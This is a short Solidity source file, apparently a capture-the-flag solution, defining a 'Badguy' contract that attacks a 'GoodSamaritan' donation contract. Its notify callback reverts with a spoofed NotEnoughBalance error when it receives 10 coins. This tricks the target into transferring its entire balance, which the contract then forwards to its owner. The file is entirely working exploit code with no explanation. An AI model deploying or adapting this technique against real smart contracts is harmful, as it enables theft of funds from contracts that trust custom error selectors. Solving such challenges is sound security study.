// SPDX-License-Identifier: MIT
pragma solidity >0.8.0;

interface INotifyable {
    function notify(uint256 amount) external;
}

interface ICoin {
    function transfer(address dest_, uint256 amount_) external;
}

interface IGoodSamaritan {
    function requestDonation() external returns(bool enoughBalance);
}

contract Badguy is INotifyable{
    
    address owner;
    ICoin coin;

    constructor(ICoin _coin){
        owner = msg.sender;
        coin = _coin;
    }

    error NotEnoughBalance();
    
    function notify(uint256 amount) external override{
        if(amount == 10) revert NotEnoughBalance();
        else coin.transfer(owner, amount);
    }

    function exploit(IGoodSamaritan target) external {
        target.requestDonation();
    }
}